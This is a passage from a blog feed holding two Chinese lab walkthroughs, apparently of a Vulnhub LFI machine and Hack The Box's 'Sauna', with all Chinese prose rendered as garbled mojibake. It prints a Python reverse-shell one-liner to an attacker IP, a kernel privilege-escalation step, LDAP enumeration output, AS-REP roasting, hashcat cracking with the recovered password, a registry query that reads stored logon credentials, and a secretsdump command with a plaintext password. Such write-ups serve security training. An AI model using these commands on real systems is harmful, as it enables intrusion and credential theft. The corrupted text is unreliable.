<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬å°è¯•å°†ä¸€å¥è¯å†™è¿›æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ä¸º<code>/var/log/auth.log</code>ï¼Œå‘ç°å·²è¢«å†™å…¥æ—¥å¿—å¹¶æˆåŠŸæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤<br><img src="https://img-blog.csdnimg.cn/8fc98d199a4845c1a5e8d72245c7b934.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/bf1f3a8f67a6457998b22f5bd225ccc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŸ¥æ‰¾pythonæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™å¯ä»¥åå¼¹shellåˆ°æˆ‘ä»¬æœ¬åœ°çš„æœºå­ä¸Šã€‚å¯ä»¥çœ‹åˆ°pythonæ˜¯å­˜åœ¨çš„ï¼Œå¹¶ä¸”ç‰ˆæœ¬ä¸º3.5<br><img src="https://img-blog.csdnimg.cn/4d606cef990543d381d880d6a94f170c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†æ‰§è¡Œå¦‚ä¸‹çš„payloadæ·»åŠ åˆ°cmdå‚æ•°åè·å¾—ä¸€ä¸ªshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.101.196&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/8ac1207e853b4bfa8655671b22b4939d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬å°†linpeas.shè„šæœ¬ä¸Šä¼ åˆ°é¶æœºä¸Šï¼Œå¹¶æ‰§è¡Œå®ƒ<br><img src="https://img-blog.csdnimg.cn/23a8477f887a40c3b6df7f1df69d406b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­˜åœ¨ä¸€ä¸ªlinuxå†…æ ¸æ¼æ´<br><img src="https://img-blog.csdnimg.cn/e962cb6858c242bea4f04c0d8d28b3b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°è¿™ä¸ªå†…æ ¸æ¼æ´å¯¹åº”çš„æ¼æ´ç¼–å·ä¸º<code>CVE-2017-6074</code>ï¼Œæˆ‘ä»¬å°†å…¶ç¼–è¯‘å˜ä¸Šä¼ åˆ°é¶æœºä¸Šï¼Œæ‰§è¡Œå³root<br><img src="https://img-blog.csdnimg.cn/8d5db74c976140df8fd5b0d408768a02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/335e4f13aa7e4d8c9ebaf95cb4c8749c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Sauna</title>
    <url>/2021/12/24/Sauna/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/0c4f7155f0a144fca320112bb07de39c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°å¼€æ”¾äº†445ï¼Œ80ï¼Œ88ï¼Œ5985è¿™äº›å¸¸è§çš„å¯èƒ½å­˜åœ¨æ¼æ´çš„ç«¯å£ã€‚å› ä¸ºå­˜åœ¨ldapæœåŠ¡ï¼Œå¯èƒ½è€ƒè™‘åˆ°å­˜åœ¨å†…ç½‘<br><img src="https://img-blog.csdnimg.cn/18c6ed7749514992adad88f2a6fa97f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>å‘ç°äº†smbæœåŠ¡ï¼Œå°è¯•æ˜¯å¦å¯ä»¥ç™»å½•<br><img src="https://img-blog.csdnimg.cn/cae8f24d7edf4d9ab4db6a15e3d5c60b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»å½•å¤±è´¥ï¼Œé‚£æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ldapæœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/f0249267ceca4d73943001c895249779.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.10.175 -b <span class="string">&quot;dc=EGOTISTICAL-BANK,dc=local&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=EGOTISTICAL-BANK,dc=local&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: domain</span><br><span class="line">objectClass: domainDNS</span><br><span class="line">distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">instanceType: 5</span><br><span class="line">whenCreated: 20200123054425.0Z</span><br><span class="line">whenChanged: 20211018114224.0Z</span><br><span class="line">subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">uSNCreated: 4099</span><br><span class="line">dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==</span><br><span class="line">uSNChanged: 98336</span><br><span class="line">name: EGOTISTICAL-BANK</span><br><span class="line">objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==</span><br><span class="line">replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJ/uf</span><br><span class="line"> RcDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA</span><br><span class="line"> AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4</span><br><span class="line"> TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==</span><br><span class="line">creationTime: 132790309446175365</span><br><span class="line">forceLogoff: -9223372036854775808</span><br><span class="line">lockoutDuration: -18000000000</span><br><span class="line">lockOutObservationWindow: -18000000000</span><br><span class="line">lockoutThreshold: 0</span><br><span class="line">maxPwdAge: -36288000000000</span><br><span class="line">minPwdAge: -864000000000</span><br><span class="line">minPwdLength: 7</span><br><span class="line">modifiedCountAtLastProm: 0</span><br><span class="line">nextRid: 1000</span><br><span class="line">pwdProperties: 1</span><br><span class="line">pwdHistoryLength: 24</span><br><span class="line">objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG</span><br><span class="line">serverState: 1</span><br><span class="line">uASCompat: 1</span><br><span class="line">modifiedCount: 1</span><br><span class="line">auditingPolicy:: AAE=</span><br><span class="line">nTMixedDomain: 0</span><br><span class="line">rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name</span><br><span class="line"> ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">systemFlags: -1946157056</span><br><span class="line">wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT</span><br><span class="line"> ISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra</span><br><span class="line"> m Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin</span><br><span class="line"> cipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=</span><br><span class="line"> EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E</span><br><span class="line"> GOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC</span><br><span class="line"> AL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,</span><br><span class="line"> DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA</span><br><span class="line"> L-BANK,DC=LOCAL</span><br><span class="line">objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D</span><br><span class="line"> C=LOCAL</span><br><span class="line">isCriticalSystemObject: TRUE</span><br><span class="line">gPLink: [LDAP://CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=Policies,CN=Syste</span><br><span class="line"> m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]</span><br><span class="line">dSCorePropagationData: 16010101000000.0Z</span><br><span class="line">otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic</span><br><span class="line"> e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN</span><br><span class="line"> =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">ms-DS-MachineAccountQuota: 10</span><br><span class="line">msDS-Behavior-Version: 7</span><br><span class="line">msDS-PerUserTrustQuota: 1</span><br><span class="line">msDS-AllUsersTrustQuota: 1000</span><br><span class="line">msDS-PerUserTrustTombstonesQuota: 10</span><br><span class="line">msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na</span><br><span class="line"> me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N</span><br><span class="line"> ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-NcType: 0</span><br><span class="line">msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE</span><br><span class="line">dc: EGOTISTICAL-BANK</span><br><span class="line"><span class="comment"># Users, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Computers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Domain Controllers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># System, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># LostAndFound, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Infrastructure, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Program Data, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># NTDS Quotas, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Managed Service Accounts, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Keys, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># TPM Devices, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Builtin, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Hugo Smith, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC</span><br><span class="line"> AL</span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"><span class="comment"># numResponses: 19</span></span><br><span class="line"><span class="comment"># numEntries: 15</span></span><br><span class="line"><span class="comment"># numReferences: 3</span></span><br></pre></td></tr></table></figure>
<!--more-->

<p>æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå¯ç–‘çš„ç”¨æˆ·ã€‚è™½ç„¶æ˜¯æ‰¾åˆ°äº†ç”¨æˆ·åï¼Œä½†æ˜¯æˆ‘ä»¬ä¸æ²¡æœ‰æ‰¾åˆ°ç›¸å¯¹åº”çš„å‡­æ®ã€‚è¿™æ—¶å€™æˆ‘ä»¬åˆ‡æ¢ä¸€ä¸‹æ€è·¯ï¼Œæµè§ˆä¸€ä¸‹webæœåŠ¡ä¸­æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯å¯ä»¥æä¾›ç»™æˆ‘ä»¬çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/b628002a16b3488681fd917e8308c38f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨å…³äºé¡µé¢ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†è¿™ä¸¤ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œé•¿å¾—è²Œä¼¼å’Œæˆ‘ä»¬ä¿¡æ¯æ”¶é›†å‡ºæ¥çš„ç”¨æˆ·ä¿¡æ¯æœ‰ç‚¹ç±»ä¼¼ã€‚é‚£æˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™æœ‰å¯èƒ½æ˜¯ç³»ç»Ÿä¸­çœŸå®å­˜åœ¨çš„ç”¨æˆ·ã€‚<br><img src="https://img-blog.csdnimg.cn/c588d6ef57d149fabf5e731d9cc5036d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•è·å–ä¸€ä¸‹ç”¨æˆ·å¯¹åº”çš„å“ˆå¸Œå€¼ï¼Œä½¿ç”¨çš„å·¥å…·æ˜¯kerbruteï¼Œå‘ç°å­˜åœ¨<code>hsmith</code>å’Œ<code>fsmith</code>è¿™ä¸¤ä¸ªç”¨æˆ·å¹¶ä¸”å‘ç°äº†å®ƒä»¬çš„TGTæ¡ç›®ã€‚<img src="https://img-blog.csdnimg.cn/2627486af25c47ab96b900a0ec75f39b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å…ˆä½¿ç”¨impacketåŒ…ä¸­çš„<code>GetNPUsers.py</code>è·å–fsmithç”¨æˆ·çš„hashå€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/c0949aa761a34cd5ac4cb072c102afb1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†ä»–çš„hashå€¼ä¿å­˜ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨hashcatå°è¯•èƒ½ä¸èƒ½ç ´è§£æˆåŠŸã€‚ç ´è§£æˆåŠŸçš„å¯†ç æ˜æ–‡å€¼ä¸º<code>Thestrokes23</code>ã€‚è¿™é‡Œè§£é‡Šä¸€ä¸‹å‚æ•°çš„å«ä¹‰ï¼Œ-mæŒ‡çš„æ˜¯æŒ‡å®šæ–‡ä»¶çš„æ•£åˆ—å€¼ç±»å‹ï¼Œ-aæŒ‡çš„æ˜¯æŒ‡å®šç ´è§£æ¨¡å¼ï¼Œ-wæ˜¯æŒ‡å®šå­—å…¸ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 fsmith.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/41e6765292b042028af2e5a18a7e63c0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/e09120c6a3ab4d2ebc84502a9a0a58b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/353674983008426c8e5578b2c332cf9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ—¢ç„¶ç ´è§£åˆ°äº†å¯†ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç™»å½•SMBå’ŒWinRMæœåŠ¡äº†ã€‚æˆ‘ä»¬å…ˆæŸ¥çœ‹SMBæœåŠ¡ï¼Œå‘ç°äº†ä¸¤ä¸ªå…±äº«æœåŠ¡ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªæ˜¯æœ‰ç”¨çš„ã€‚ã€‚ã€‚<br><img src="https://img-blog.csdnimg.cn/03e072a109fb4bbea8beb8f0a955ab09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å°è¯•åˆ©ç”¨WinRMå§ï¼Œç™»å½•æˆåŠŸï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflagå€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/6b0e08188c09403f95a20de67f6292de.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬æ‹¿åˆ°çš„åªæ˜¯æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å½“ç„¶æ˜¯ç®¡ç†å‘˜æƒé™ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹çœ‹éƒ½å­˜åœ¨å“ªäº›ç”¨æˆ·ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªsvc_loanmgrç”¨æˆ·ã€‚<br><img src="https://img-blog.csdnimg.cn/db445cc21449494680e87b2d7ae329f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨powershellå‘½ä»¤æŸ¥çœ‹åˆ°å®ƒå¯¹åº”çš„å¯†ç ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#x27;</span> | <span class="built_in">select</span> <span class="string">&quot;Default*&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d774cd7d287541eb8c6c68b368fe0424.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªå‘½ä»¤è¦è®°ä½å®ƒè¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šä¼ <code>WindowsEnum.ps1</code>è„šæœ¬æ¥å®Œæˆè¿™ä»»åŠ¡ã€‚<br><img src="https://img-blog.csdnimg.cn/86d1160f61414340a78ab8afd834f34a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/8c4904ed1ffe46219f42192926e2b54c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°è¿™ä¸ªå¯†ç åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ç™»é™†è¿›å»ã€‚ä½†æ˜¯æˆ‘è¯•äº†å¾ˆå¤šæ¬¡éƒ½æ˜¯ç™»é™†å¤±è´¥<br><img src="https://img-blog.csdnimg.cn/431a23d1a026444781060ce56c83ade6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æ²¡åŠæ³•äº†ï¼Œæˆ‘å°è¯•ä½¿ç”¨<code>secretsdump.py</code>è„šæœ¬çœ‹çœ‹èƒ½ä¸èƒ½æˆåŠŸè·å–åˆ°è¿™ä¸ªç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚æˆ‘ä»¬æ„å¤–å‘ç°administratorçš„hashå€¼ï¼Œå‘å¤§è´¢äº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.175 svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175</span><br></pre></td></tr></table></figure>
